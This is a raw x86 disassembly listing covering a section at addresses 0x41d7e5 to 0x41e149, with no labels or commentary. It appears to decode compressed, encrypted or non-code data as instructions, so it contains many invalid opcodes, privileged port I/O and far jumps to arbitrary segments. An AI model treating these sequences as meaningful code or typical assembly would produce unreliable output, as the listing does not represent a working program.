  41d7e5:	xor    ebp,edx
  41d7e7:	sbb    esi,esp
  41d7e9:	outs   dx,BYTE PTR ds:[esi]
  41d7ea:	inc    edx
  41d7eb:	int3   
  41d7ec:	mov    ds:0xc44ec18b,al
  41d7f1:	push   edi
  41d7f2:	and    bh,BYTE PTR [edi-0x61e52e86]
  41d7f8:	fstp   QWORD PTR [esi+0x1b]
  41d7fb:	jl     0x41d82f
  41d7fd:	inc    edi
  41d7fe:	stc    
  41d7ff:	icebp  
  41d800:	ss repz stc 
  41d803:	xor    BYTE PTR [eax-0x29],cl
  41d806:	sub    al,0xae
  41d808:	pop    edi
  41d809:	push   ss
  41d80a:	call   0xef8e:0xb8351e95
  41d811:	cmc    
  41d812:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d813:	push   edi
  41d814:	out    dx,al
  41d815:	pop    esi
  41d816:	(bad)  
  41d817:	outs   dx,BYTE PTR ds:[esi]
  41d818:	shr    BYTE PTR [edx+0x1e],cl
  41d81b:	and    al,0xa8
  41d81d:	stos   DWORD PTR es:[edi],eax
  41d81e:	or     ebx,ebp
  41d820:	sti    
  41d821:	test   DWORD PTR [ebx+0x30],esi
  41d824:	sti    
  41d825:	xor    eax,0xd7b6e82
  41d82a:	call   0x1005:0x31e5b3b
  41d831:	jb     0x41d891
  41d833:	mov    edi,0xbfaf716c
  41d838:	jnp    0x41d85d
  41d83a:	or     al,0xfe
  41d83c:	xchg   ebx,eax
  41d83d:	push   ds
  41d83e:	je     0x41d7c5
  41d840:	jno    0x41d7e9
  41d842:	jnp    0x41d846
  41d844:	or     edx,DWORD PTR [edx]
  41d846:	sub    esp,DWORD PTR [edi+esi*1]
  41d849:	fs sub eax,0xec336e7c
  41d84f:	jecxz  0x41d87c
  41d851:	in     eax,0x6c
  41d853:	ins    BYTE PTR es:[edi],dx
  41d854:	into   
  41d855:	cmp    esi,DWORD PTR [ebx+0x11]
  41d858:	and    BYTE PTR [ebp-0x8cc78e1],ch
  41d85e:	test   al,0xd4
  41d860:	cmp    esp,DWORD PTR [edi-0x756c8c7]
  41d866:	xchg   edi,eax
  41d867:	cmp    ah,BYTE PTR [ebx-0x35]
  41d86a:	sub    BYTE PTR [edx+edi*4],bh
  41d86d:	arpl   WORD PTR [edi+0x1e5ae290],bp
  41d873:	or     al,0x80
  41d875:	imul   esi,DWORD PTR [ebp-0x49],0x1e
  41d879:	mov    esp,0x23fe2ee3
  41d87e:	and    BYTE PTR [edi+0x38],al
  41d881:	cmp    al,0xa6
  41d883:	add    ebp,edx
  41d885:	lock lahf 
  41d887:	mov    cl,0xc8
  41d889:	xchg   esp,eax
  41d88a:	ds pop ss
  41d88c:	fs dec esp
  41d88e:	jecxz  0x41d8b9
  41d890:	(bad)  
  41d891:	out    dx,eax
  41d892:	sbb    esp,ecx
  41d894:	(bad)  
  41d896:	pop    es
  41d897:	sti    
  41d898:	pop    esp
  41d899:	mov    ebp,0x85c0f995
  41d89e:	cdq    
  41d89f:	cmp    DWORD PTR [esp+eiz*2-0x59999f45],ebp
  41d8a6:	sub    BYTE PTR [eax-0x75],al
  41d8a9:	dec    ebp
  41d8aa:	rol    ch,cl
  41d8ac:	mov    bh,0x3b
  41d8ae:	int3   
  41d8af:	sahf   
  41d8b0:	loop   0x41d88d
  41d8b2:	and    DWORD PTR [esi+ecx*8],edx
	...
  41d915:	add    ah,al
  41d917:	ins    BYTE PTR es:[edi],dx
  41d918:	pop    es
  41d919:	pushf  
  41d91a:	scas   eax,DWORD PTR es:[edi]
  41d91b:	(bad)  
  41d91c:	fistp  QWORD PTR [ebx+eiz*8+0x0]
  41d920:	inc    eax
  41d921:	jmp    0x38be:0x746ff69e
  41d928:	add    DWORD PTR [eax],eax
  41d92a:	pop    es
  41d92b:	add    DWORD PTR [eax],eax
  41d92d:	add    BYTE PTR [edi-0xe85d1f2],dh
  41d933:	fs xor al,0xb2
  41d936:	ds push esi
  41d938:	ins    BYTE PTR es:[edi],dx
  41d939:	sbb    al,0x7e
  41d93b:	jno    0x41d9a3
  41d93d:	cmp    al,0xc6
  41d93f:	jge    0x41d929
  41d941:	add    al,BYTE PTR [esp+esi*2]
  41d944:	add    eax,0x964b738b
  41d949:	inc    edi
  41d94a:	out    dx,eax
  41d94b:	xchg   ebx,eax
  41d94c:	push   edi
  41d94d:	xlat   BYTE PTR ds:[ebx]
  41d94e:	sub    eax,0xe7ed87db
  41d953:	int    0x7a
  41d955:	lods   eax,DWORD PTR ds:[esi]
  41d956:	dec    ebp
  41d957:	pusha  
  41d958:	xchg   ebp,eax
  41d959:	loopne 0x41d946
  41d95b:	pop    ecx
  41d95c:	xchg   ebx,eax
  41d95d:	fild   WORD PTR [eax-0x3b721f83]
  41d963:	mov    dh,0x8c
  41d965:	out    0x5a,eax
  41d967:	xchg   BYTE PTR [edi-0x40],bl
  41d96a:	dec    ebx
  41d96b:	dec    ecx
  41d96c:	push   edi
  41d96d:	sbb    DWORD PTR [edx],edx
  41d96f:	les    edx,FWORD PTR [ecx-0x48]
  41d972:	loopne 0x41d908
  41d974:	sar    ah,0x58
  41d977:	and    al,0xd6
  41d979:	pop    eax
  41d97a:	mov    dl,0xe1
  41d97c:	or     eax,0xdd74953d
  41d981:	ror    al,0x88
  41d984:	jl     0x41d91e
  41d986:	mov    eax,ds:0x8a4ff168
  41d98b:	lds    ebp,FWORD PTR [edi-0x6046b7b4]
  41d991:	cmp    al,0x67
  41d993:	call   0x640a:0xbfa758fa
  41d99a:	mov    ds:0x1f5bdbb4,eax
  41d99f:	jle    0x41d9f3
  41d9a1:	mov    eax,ds:0xcc799341
  41d9a6:	pop    ebx
  41d9a7:	push   cs
  41d9a8:	sub    bh,BYTE PTR [ebp-0x1a]
  41d9ab:	sub    DWORD PTR [edi+0x4b],esp
  41d9ae:	push   ebx
  41d9af:	sub    dl,BYTE PTR [edi+0x6f]
  41d9b2:	ins    DWORD PTR es:[edi],dx
  41d9b3:	sbb    bl,BYTE PTR [ebp+eiz*8-0x328de444]
  41d9ba:	jp     0x41d9d5
  41d9bc:	or     al,BYTE PTR [eax-0x18]
  41d9bf:	mov    eax,0x81f5c765
  41d9c4:	add    eax,0x74f1ebbf
  41d9c9:	cwde   
  41d9ca:	dec    eax
  41d9cb:	int3   
  41d9cc:	out    dx,al
  41d9cd:	int    0xd4
  41d9cf:	rcr    ch,cl
  41d9d1:	arpl   WORD PTR [ebp+ecx*4-0x680898bd],bp
  41d9d8:	sahf   
  41d9d9:	call   0xf15b6f28
  41d9de:	imul   eax,DWORD PTR [esi-0x37],0x7
  41d9e2:	fisttp QWORD PTR [edx+0x6e047bda]
  41d9e8:	inc    ebp
  41d9e9:	mov    eax,ds:0xce2f4344
  41d9ee:	out    0x4e,ax
  41d9f1:	outs   dx,DWORD PTR ds:[esi]
  41d9f2:	sub    al,0x8e
  41d9f4:	out    dx,al
  41d9f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9f6:	repnz mov ebp,eax
  41d9f9:	push   ds
  41d9fa:	push   ss
  41d9fb:	icebp  
  41d9fc:	sahf   
  41d9fd:	mov    edi,0x46bcb7af
  41da02:	leave  
  41da03:	ja     0x41d9f9
  41da05:	in     al,dx
  41da06:	mov    bh,0x8b
  41da08:	or     BYTE PTR [edx+0x71fb36b2],al
  41da0e:	imul   ebx,DWORD PTR [edi+0x3],0xffffff9f
  41da12:	push   ecx
  41da13:	cli    
  41da14:	sbb    edi,DWORD PTR [eax-0x6df3967d]
  41da1a:	mov    ds:0x56b6b883,al
  41da1f:	rcl    eax,0x2b
  41da22:	retf   0xefcd
  41da25:	test   DWORD PTR [esi+0x255b6534],esi
  41da2b:	enter  0xd58f,0x79
  41da2f:	mov    cl,0x99
  41da31:	sub    edi,esi
  41da33:	dec    ebx
  41da34:	sbb    al,0x0
	...
  41da96:	sbb    al,0x15
  41da98:	jnp    0x41daed
  41da9a:	jnp    0x41db1b
  41da9c:	cmp    al,0x5f
  41da9e:	out    dx,al
  41da9f:	lahf   
  41daa0:	push   esi
  41daa1:	pop    es
  41daa2:	sub    al,0x81
  41daa4:	jle    0x41da36
  41daa6:	lds    edi,FWORD PTR [ecx]
  41daa8:	add    DWORD PTR [eax],eax
  41daaa:	pop    es
  41daab:	add    DWORD PTR [eax],eax
  41daad:	add    al,ah
  41daaf:	out    dx,al
  41dab0:	pusha  
  41dab1:	cwde   
  41dab2:	mov    cl,0x3e
  41dab4:	mov    ecx,0xdb5fb733
  41dab9:	mov    ecx,0x72f23ed3
  41dabe:	and    al,0xef
  41dac0:	sbb    eax,0xc792fe0d
  41dac5:	inc    ecx
  41dac6:	imul   ebx,ebx,0x89db9d8f
  41dacc:	xchg   ecx,eax
  41dacd:	out    0x8f,eax
  41dacf:	stos   BYTE PTR es:[edi],al
  41dad0:	leave  
  41dad1:	mov    esi,ebp
  41dad3:	add    al,0x83
  41dad5:	hlt    
  41dad6:	add    al,0x32
  41dad8:	pop    eax
  41dad9:	inc    esi
  41dada:	loope  0x41db42
  41dadc:	jno    0x41dab1
  41dade:	pop    ebx
  41dadf:	imul   ebx,DWORD PTR fs:[edx],0x58458c42
  41dae6:	ret    0xdddb
  41dae9:	adc    DWORD PTR [ecx-0x29b63e69],ebp
  41daef:	jmp    0x9c39:0x2203a4eb
  41daf6:	aaa    
  41daf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daf8:	inc    esp
  41daf9:	add    DWORD PTR [edx+0x7d],esi
  41dafc:	or     ebp,DWORD PTR [ebx+edx*2]
  41daff:	stc    
  41db00:	sbb    al,0x92
  41db02:	inc    esp
  41db03:	adc    eax,0x17530f53
  41db08:	or     edi,ebx
  41db0a:	lods   eax,DWORD PTR ds:[esi]
  41db0b:	ret    0xe042
  41db0e:	(bad)  
  41db0f:	outs   dx,DWORD PTR ds:[esi]
  41db10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db11:	call   0xf3b4:0xf0845e98
  41db18:	outs   dx,BYTE PTR ds:[esi]
  41db19:	push   cs
  41db1a:	ja     0x41db1b
  41db1c:	push   ebp
  41db1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db1e:	retf   0x7710
  41db21:	pop    edx
  41db22:	ds push ebp
  41db24:	out    dx,al
  41db25:	adc    al,0xc3
  41db27:	cli    
  41db28:	pusha  
  41db29:	es sbb ecx,esi
  41db2c:	xchg   ebx,eax
  41db2d:	push   0xacdac9e0
  41db32:	scas   eax,DWORD PTR es:[edi]
  41db33:	retf   
  41db34:	aad    0xd
  41db36:	lock nop
  41db38:	stc    
  41db39:	int    0x20
  41db3b:	mov    esp,eax
  41db3d:	cmp    bl,BYTE PTR ds:0xbdf93336
  41db43:	sbb    ebp,ecx
  41db45:	or     al,0x47
  41db47:	adc    DWORD PTR [edi],edx
  41db49:	and    dh,BYTE PTR [esi]
  41db4b:	out    dx,al
  41db4c:	test   DWORD PTR [edx],0x8fd0acf0
  41db52:	mov    eax,ss:0x4de54233
  41db58:	mov    dh,0x67
  41db5a:	lods   al,BYTE PTR ds:[esi]
  41db5b:	push   ds
  41db5c:	aam    0xd6
  41db5e:	jge    0x41daf5
  41db60:	sub    BYTE PTR [edi+0x2a],dh
  41db63:	mov    ecx,0xd45867df
  41db68:	es dec ebp
  41db6a:	xchg   edx,eax
  41db6b:	out    dx,eax
  41db6c:	ins    DWORD PTR es:[edi],dx
  41db6d:	sub    eax,DWORD PTR [ebp-0x70]
  41db70:	push   edi
  41db71:	cmc    
  41db72:	mov    WORD PTR [ebx+ecx*8+0x4eb071f2],fs
  41db79:	mov    eax,ds:0x7adfe672
  41db7e:	and    DWORD PTR [esi],0x37b6b4e1
  41db84:	mov    bh,0x33
  41db86:	cmp    al,BYTE PTR [ebx+0x44]
  41db89:	setns  BYTE PTR ds:[edx]
  41db8d:	icebp  
  41db8e:	sbb    al,0x76
  41db90:	es mov ebp,0x2534bd6b
  41db96:	dec    esi
  41db97:	rol    DWORD PTR [esi-0x1df1dbe7],cl
  41db9d:	js     0x41dbb9
  41db9f:	dec    edx
  41dba0:	dec    edx
  41dba1:	aam    0x23
  41dba3:	cli    
  41dba4:	icebp  
  41dba5:	das    
  41dba6:	cmp    BYTE PTR [eax+eiz*8],cl
  41dba9:	test   DWORD PTR [eax],ecx
  41dbab:	jmp    0x41db8e
  41dbad:	(bad)  
  41dbae:	out    dx,al
  41dbaf:	mov    eax,ds:0xa4617044
  41dbb4:	stos   BYTE PTR es:[edi],al
	...
  41dc15:	add    BYTE PTR [edi-0x36],ch
  41dc18:	adc    eax,0xefdfb598
  41dc1d:	dec    ebp
  41dc1f:	ja     0x41dc8f
  41dc21:	aas    
  41dc22:	outs   dx,DWORD PTR ds:[esi]
  41dc23:	xchg   esi,eax
  41dc24:	sbb    esp,edi
  41dc26:	int3   
  41dc27:	cmp    al,BYTE PTR [ecx]
  41dc29:	add    BYTE PTR [edi],al
  41dc2b:	add    DWORD PTR [eax],eax
  41dc2d:	add    bl,bh
  41dc2f:	repz push ebx
  41dc31:	pop    ds
  41dc32:	retf   0x9f41
  41dc35:	or     eax,0xc7085168
  41dc3a:	outs   dx,DWORD PTR ds:[esi]
  41dc3b:	push   0x19
  41dc3d:	jmp    0x9c6930fa
  41dc42:	add    ebp,esi
  41dc44:	cmc    
  41dc45:	fidiv  DWORD PTR [ecx-0x4b]
  41dc48:	js     0x41dcbd
  41dc4a:	push   es
  41dc4b:	inc    edi
  41dc4c:	and    BYTE PTR [eax-0x38],bl
  41dc4f:	pop    eax
  41dc50:	mov    cl,0xb8
  41dc52:	cmp    DWORD PTR fs:[ebx+0x5ee86936],edx
  41dc59:	sub    eax,0x1d8edc7a
  41dc5e:	jo     0x41dc0f
  41dc60:	imul   ebx,esp,0xffffffa2
  41dc63:	pop    esi
  41dc64:	lock pop ds
  41dc66:	cmp    al,0xb9
  41dc68:	mov    edx,0x635cc466
  41dc6d:	std    
  41dc6e:	xchg   DWORD PTR [eax+esi*8+0x32],esp
  41dc72:	test   BYTE PTR [edx+eax*1+0x20],0x35
  41dc77:	fsub   DWORD PTR [ebx+eiz*8]
  41dc7a:	mov    cl,BYTE PTR [eax+edx*8]
  41dc7d:	xor    bl,0x60
  41dc80:	jg     0x41dc5a
  41dc82:	retf   
  41dc83:	mul    BYTE PTR [edx-0x39]
  41dc86:	xor    ecx,esp
  41dc88:	lods   al,BYTE PTR ds:[esi]
  41dc89:	xor    bh,BYTE PTR [edi]
  41dc8b:	mov    esi,ds
  41dc8d:	in     eax,dx
  41dc8e:	jl     0x41dc35
  41dc90:	dec    eax
  41dc91:	scas   eax,DWORD PTR es:[edi]
  41dc92:	hlt    
  41dc93:	pushf  
  41dc94:	mov    ah,0x6e
  41dc96:	sbb    eax,0x1ccce623
  41dc9b:	jl     0x41dc64
  41dc9d:	cmp    eax,0xded70edd
  41dca2:	add    esp,DWORD PTR [esi+esi*2]
  41dca5:	xlat   BYTE PTR ds:[ebx]
  41dca6:	adc    BYTE PTR [edi],bh
  41dca8:	jnp    0x41dd12
  41dcaa:	add    BYTE PTR [eax],bl
  41dcac:	xchg   edx,eax
  41dcad:	inc    ebx
  41dcae:	inc    edi
  41dcaf:	cdq    
  41dcb0:	jno    0x41dce8
  41dcb2:	ret    0x7885
  41dcb5:	aam    0x56
  41dcb7:	adc    esi,edx
  41dcb9:	pop    es
  41dcba:	xor    eax,0x1ed72fd7
  41dcbf:	xchg   edi,eax
  41dcc0:	jo     0x41dd22
  41dcc2:	cmp    eax,0xe329c1ae
  41dcc7:	jns    0x41dc71
  41dcc9:	mov    eax,ds:0xc8ec6979
  41dcce:	and    DWORD PTR [edi+0x21b590eb],ebp
  41dcd4:	jge    0x41dcd9
  41dcd6:	out    dx,eax
  41dcd7:	fldenv [ebx-0x68]
  41dcda:	dec    eax
  41dcdb:	pop    ecx
  41dcdc:	sub    DWORD PTR [ecx+0x2366fe26],ebp
  41dce2:	inc    ecx
  41dce3:	call   0xbc56e4d6
  41dce8:	or     DWORD PTR [ebp+0x14065652],ebx
  41dcee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dcef:	cmovb  edx,ecx
  41dcf2:	lea    edx,[eax-0x71a88ec5]
  41dcf8:	mov    ch,0x72
  41dcfa:	mov    eax,ds:0x56885148
  41dcff:	ja     0x41dce6
  41dd01:	lods   al,BYTE PTR ds:[esi]
  41dd02:	loopne 0x41dd14
  41dd04:	sub    ecx,ecx
  41dd06:	adc    BYTE PTR [edi+0x55],0x8b
  41dd0a:	pusha  
  41dd0b:	and    ecx,ecx
  41dd0d:	cwde   
  41dd0e:	mov    cl,0x8b
  41dd10:	out    dx,eax
  41dd11:	test   eax,0x367c6a36
  41dd16:	ret    
  41dd17:	sti    
  41dd18:	bound  edx,QWORD PTR [esi+0x4f]
  41dd1b:	inc    ebp
  41dd1c:	xor    al,0x3a
  41dd1e:	mov    ebp,0x3b8f7471
  41dd23:	outs   dx,DWORD PTR ds:[esi]
  41dd24:	loopne 0x41dca6
  41dd26:	test   ebp,0xeb714776
  41dd2c:	add    eax,0x9951e296
  41dd31:	add    bh,al
  41dd33:	add    eax,0x9a
	...
  41dd94:	add    BYTE PTR [eax],al
  41dd96:	and    bl,dh
  41dd98:	das    
  41dd99:	cmp    bh,0xde
  41dd9c:	lods   eax,DWORD PTR ds:[esi]
  41dd9d:	repz mov ds:0xf71667bb,eax
  41dda3:	out    0x4,al
  41dda5:	stos   BYTE PTR es:[edi],al
  41dda6:	sar    DWORD PTR [ebx],cl
  41dda8:	add    DWORD PTR [eax],eax
  41ddaa:	pop    es
  41ddab:	add    DWORD PTR [eax],eax
  41ddad:	add    BYTE PTR [eax],bl
  41ddaf:	outs   dx,BYTE PTR ds:[esi]
  41ddb0:	scas   al,BYTE PTR es:[edi]
  41ddb1:	mov    dl,0x1
  41ddb3:	and    BYTE PTR [edx-0x273b36f6],al
  41ddb9:	stos   BYTE PTR es:[edi],al
  41ddba:	pop    ebx
  41ddbb:	cmp    al,bh
  41ddbd:	nop
  41ddbe:	ins    BYTE PTR es:[edi],dx
  41ddbf:	lods   eax,DWORD PTR ds:[esi]
  41ddc0:	jno    0x41ddcb
  41ddc2:	inc    ebp
  41ddc3:	cli    
  41ddc4:	bound  esi,QWORD PTR [edx-0x3cb05727]
  41ddca:	and    BYTE PTR [eax+esi*8+0x6c943fef],ah
  41ddd1:	add    BYTE PTR [eax-0x27],cl
  41ddd4:	and    DWORD PTR [ecx-0x38],eax
  41ddd7:	mov    ecx,0x9dea7459
  41dddc:	jl     0x41dd6e
  41ddde:	shr    eax,cl
  41dde0:	mov    ah,ch
  41dde2:	dec    esi
  41dde3:	inc    eax
  41dde4:	pop    edx
  41dde5:	pop    edi
  41dde6:	dec    ecx
  41dde7:	or     BYTE PTR [edi],bh
  41dde9:	int    0xf5
  41ddeb:	int3   
  41ddec:	dec    esp
  41dded:	xchg   al,al
  41ddef:	mov    dl,0x38
  41ddf1:	arpl   WORD PTR [ecx+0x41],ax
  41ddf4:	sub    BYTE PTR [ebp-0x23],0xdf
  41ddf8:	xchg   ecx,eax
  41ddf9:	shl    dh,1
  41ddfb:	repz (bad) 
  41ddfd:	sbb    BYTE PTR [esi+0x6b],ah
  41de00:	cmc    
  41de01:	vmovhps xmm6,xmm6,QWORD PTR [ecx-0x4211c35d]
  41de09:	clc    
  41de0a:	mov    ch,0x5a
  41de0c:	inc    esi
  41de0d:	mov    eax,ds:0xff76feff
  41de12:	outs   dx,DWORD PTR ds:[esi]
  41de13:	arpl   dx,si
  41de15:	dec    esp
  41de16:	pop    es
  41de17:	leave  
  41de18:	sub    eax,0x8aefe5d7
  41de1d:	enter  0xd710,0x5
  41de21:	mov    esp,DWORD PTR [edi-0x5d092d82]
  41de27:	jne    0x41ddf5
  41de29:	mov    edx,0x8957203c
  41de2e:	inc    ebx
  41de2f:	outs   dx,BYTE PTR ds:[esi]
  41de30:	fwait
  41de31:	cmp    DWORD PTR [edi+0x5743161a],edi
  41de37:	jae    0x41de46
  41de39:	fld    TBYTE PTR [ebx+0x79b72d8]
  41de3f:	jae    0x41de61
  41de41:	xchg   BYTE PTR [esi+esi*1-0x4b],bh
  41de45:	mov    dl,0xb7
  41de47:	pop    ds
  41de48:	xchg   ecx,eax
  41de49:	push   edx
  41de4a:	iret   
  41de4b:	xor    esp,ebx
  41de4d:	jne    0x41de62
  41de4f:	mov    edi,es
  41de51:	inc    esi
  41de52:	dec    ebp
  41de53:	repz test DWORD PTR [ebp+0x72d547c],ebp
  41de5a:	dec    edx
  41de5b:	push   es
  41de5c:	mov    ecx,0xc6a11674
  41de61:	mov    eax,DWORD PTR [edi]
  41de63:	test   al,0x6c
  41de65:	inc    ebx
  41de66:	cwde   
  41de67:	cmp    DWORD PTR [ebp-0x68fe74a1],eax
  41de6d:	xlat   BYTE PTR ds:[ebx]
  41de6e:	mov    ah,0xe9
  41de70:	mov    eax,ds:0xe8f63b1
  41de75:	xchg   esp,ecx
  41de77:	aam    0x5f
  41de79:	fdivp  st(6),st
  41de7b:	add    eax,0x8c99bf52
  41de80:	stos   DWORD PTR es:[edi],eax
  41de81:	dec    esp
  41de82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de83:	adc    edi,DWORD PTR [ecx]
  41de85:	in     eax,dx
  41de86:	dec    edi
  41de87:	cmc    
  41de88:	or     al,BYTE PTR [ecx+ebp*2+0x47b28844]
  41de8f:	and    al,0x13
  41de91:	aaa    
  41de92:	retf   
  41de93:	fdivr  QWORD PTR [edx]
  41de95:	cli    
  41de96:	leave  
  41de97:	or     al,0x7d
  41de99:	(bad)  
  41de9b:	jbe    0x41df16
  41de9d:	pop    esi
  41de9e:	and    al,0x2b
  41dea0:	pop    eax
  41dea1:	std    
  41dea2:	pusha  
  41dea3:	xchg   BYTE PTR [edx],ah
  41dea5:	jmp    0x41df22
  41dea7:	pusha  
  41dea8:	pop    es
  41dea9:	cmp    DWORD PTR [ecx+esi*8+0x70],ecx
  41dead:	xor    al,0xef
  41deaf:	adc    ebx,DWORD PTR [eax-0x1b]
  41deb2:	aam    0x81
  41deb4:	jp     0x41deb6
	...
  41df16:	aas    
  41df17:	daa    
  41df18:	push   ss
  41df19:	cld    
  41df1a:	push   ds
  41df1b:	std    
  41df1c:	jmp    edi
  41df1e:	pop    es
  41df1f:	adc    eax,0xf225c191
  41df24:	(bad)  
  41df25:	pminub mm7,QWORD PTR [ecx+eax*1]
  41df29:	add    BYTE PTR [edi],al
  41df2b:	add    DWORD PTR [eax],eax
  41df2d:	add    ch,dh
  41df2f:	scas   al,BYTE PTR es:[edi]
  41df30:	lock pop ds
  41df32:	xchg   esi,eax
  41df33:	imul   BYTE PTR [edx+0x1133fa35]
  41df39:	sub    al,0xc5
  41df3b:	test   eax,0xd9bc4fae
  41df40:	pop    eax
  41df41:	outs   dx,BYTE PTR ds:[esi]
  41df42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df43:	adc    eax,0xc95923f5
  41df48:	add    al,0x42
  41df4a:	rol    BYTE PTR [ecx],0x9e
  41df4d:	out    0xea,eax
  41df4f:	pop    ss
  41df50:	loope  0x41dfae
  41df52:	adc    DWORD PTR [ebx-0x4d],0x163b01b3
  41df59:	icebp  
  41df5a:	jmp    0xc49d:0x726faa4b
  41df61:	inc    ecx
  41df62:	fwait
  41df63:	aad    0xe2
  41df65:	dec    ecx
  41df66:	jo     0x41df28
  41df68:	stos   DWORD PTR es:[edi],eax
  41df69:	test   DWORD PTR [edx-0x1ffda97f],esi
  41df6f:	std    
  41df70:	cmp    esi,DWORD PTR [edx-0x672f4002]
  41df76:	push   ebx
  41df77:	adc    BYTE PTR fs:[eax+0x3b51c9d4],ch
  41df7e:	test   al,0x93
  41df80:	icebp  
  41df81:	pushf  
  41df82:	add    BYTE PTR [ebx],0x49
  41df85:	xchg   edx,eax
  41df86:	mov    BYTE PTR [edi+0x11],cl
  41df89:	rcl    bl,cl
  41df8b:	xor    ebp,DWORD PTR [ecx]
  41df8d:	je     0x41dfc6
  41df8f:	mov    eax,ds:0x5274aec9
  41df94:	cmp    BYTE PTR [edx],0x95
  41df97:	es mov bh,0xe2
  41df9a:	(bad)  
  41df9c:	in     al,0x98
  41df9e:	cwde   
  41df9f:	adc    ch,cl
  41dfa1:	adc    al,0xed
  41dfa3:	adc    eax,0xab1205f7
  41dfa8:	mov    bh,0xae
  41dfaa:	xchg   edx,eax
  41dfab:	es xor edi,ebp
  41dfae:	dec    eax
  41dfaf:	int    0xc0
  41dfb1:	push   esp
  41dfb2:	ret    
  41dfb3:	xor    al,0xc9
  41dfb5:	(bad)  
  41dfb6:	jle    0x41df70
  41dfb8:	push   ecx
  41dfb9:	push   esp
  41dfba:	mov    BYTE PTR [edx],ch
  41dfbc:	cmovns ebx,DWORD PTR [eax+0x3a]
  41dfc0:	add    al,0x8b
  41dfc2:	add    BYTE PTR [ebp-0x34f14b5b],al
  41dfc8:	fcomp  DWORD PTR [ebp-0x580a6afb]
  41dfce:	gs addr16 mov ebp,0x26b63eb5
  41dfd5:	or     cl,cl
  41dfd7:	or     al,0x17
  41dfd9:	je     0x41e016
  41dfdb:	or     edi,edx
  41dfdd:	adc    dh,ch
  41dfdf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dfe0:	ret    
  41dfe1:	xchg   edx,eax
  41dfe2:	mov    ebx,0x91f736b6
  41dfe7:	outs   dx,BYTE PTR ds:[esi]
  41dfe8:	call   0x1b4:0xdc9519f5
  41dfef:	adc    eax,0x78b2d946
  41dff4:	aam    0xda
  41dff6:	and    ebp,DWORD PTR [ecx]
  41dff8:	push   esi
  41dff9:	stc    
  41dffa:	mov    ch,0x5
  41dffc:	xchg   BYTE PTR [ebp-0x8bf75d9],ah
  41e002:	add    bl,al
  41e004:	jecxz  0x41e05b
  41e006:	inc    esi
  41e007:	push   esi
  41e008:	popa   
  41e009:	adc    esi,DWORD PTR [ebx-0x65]
  41e00c:	mov    ds:0xe32b65ba,eax
  41e011:	pop    esp
  41e012:	ss out dx,al
  41e014:	jecxz  0x41e08f
  41e016:	(bad)  
  41e017:	in     eax,dx
  41e018:	sahf   
  41e019:	gs inc ebp
  41e01b:	sbb    eax,0x3920ae89
  41e020:	xchg   ah,al
  41e022:	jg     0x41e06d
  41e024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e025:	cs (bad) 
  41e027:	retf   
  41e028:	test   BYTE PTR [edx],bl
  41e02a:	fidivr DWORD PTR [edx+edx*2]
  41e02d:	sbb    ebx,DWORD PTR [ebx-0x572895fc]
  41e033:	adc    eax,0x95
	...
  41e094:	add    BYTE PTR [eax],al
  41e096:	dec    edi
  41e097:	push   ebx
  41e098:	add    al,0xc
  41e09a:	sbb    al,0x5f
  41e09c:	dec    edi
  41e09d:	push   ebx
  41e09e:	out    0x48,eax
  41e0a0:	jge    0x41e0ce
  41e0a2:	dec    esp
  41e0a3:	sbb    eax,0x3de13214
  41e0a8:	add    DWORD PTR [eax],eax
  41e0aa:	pop    es
  41e0ab:	add    DWORD PTR [eax],eax
  41e0ad:	add    BYTE PTR [esi],al
  41e0af:	push   ecx
  41e0b0:	je     0x41e122
  41e0b2:	add    BYTE PTR [edi-0x5b],al
  41e0b5:	(bad)
  41e0b9:	xchg   DWORD PTR [ebp-0x4ce3befd],esp
  41e0bf:	cld    
  41e0c0:	adc    esp,ebx
  41e0c2:	add    esp,0x5d4c2bcc
  41e0c8:	sub    dh,BYTE PTR [ecx+0x62]
  41e0cb:	(bad)  [esi-0x25]
  41e0ce:	mov    eax,0xbde81eb3
  41e0d3:	xor    edi,DWORD PTR [esi-0x7]
  41e0d6:	mov    eax,ds:0xa86bad75
  41e0db:	mov    edi,DWORD PTR [ebp-0x7e8abb1b]
  41e0e1:	shl    ch,0x6
  41e0e4:	sar    DWORD PTR [esi+0xd],1
  41e0e7:	xchg   BYTE PTR ds:0x745cdd0b,ah
  41e0ed:	ds pop esp
  41e0ef:	xchg   edi,eax
  41e0f0:	jmp    0x41e0f5
  41e0f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e0f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0f4:	retf   0xe803
  41e0f7:	cdq    
  41e0f8:	sbb    edx,DWORD PTR [edi+0x7f]
  41e0fb:	jns    0x41e0bb
  41e0fd:	inc    eax
  41e0fe:	sbb    BYTE PTR [ecx+0x2a543bbd],cl
  41e104:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e105:	mov    bl,0x34
  41e107:	hlt    
  41e108:	cmp    ch,ch
  41e10a:	adc    eax,0x6f75d136
  41e10f:	and    BYTE PTR [ebp+0x20],dh
  41e112:	xlat   BYTE PTR ds:[ebx]
  41e113:	sar    BYTE PTR [eax+0x1052c3fe],1
  41e119:	pop    es
  41e11a:	sub    ebp,DWORD PTR [ecx+0x11105673]
  41e120:	xor    al,0x2b
  41e122:	or     eax,0x3979369c
  41e127:	inc    eax
  41e128:	je     0x41e0c6
  41e12a:	into   
  41e12b:	inc    ebp
  41e12c:	ins    DWORD PTR es:[edi],dx
  41e12d:	or     BYTE PTR [ecx-0x6f],0x73
  41e131:	or     BYTE PTR [esi],ch
  41e133:	mov    eax,0xf68a71c9
  41e138:	out    0x6,al
  41e13a:	mov    edi,DWORD PTR [edx]
  41e13c:	scas   eax,DWORD PTR es:[edi]
  41e13d:	xchg   edx,eax
  41e13e:	inc    ecx
  41e13f:	aaa    
  41e140:	dec    eax
  41e141:	adc    DWORD PTR [eax+0x50],ebx
  41e144:	mov    edx,0x3d29bb5
  41e149:	mov    WORD PTR [eax-0x2ba8599a],ds
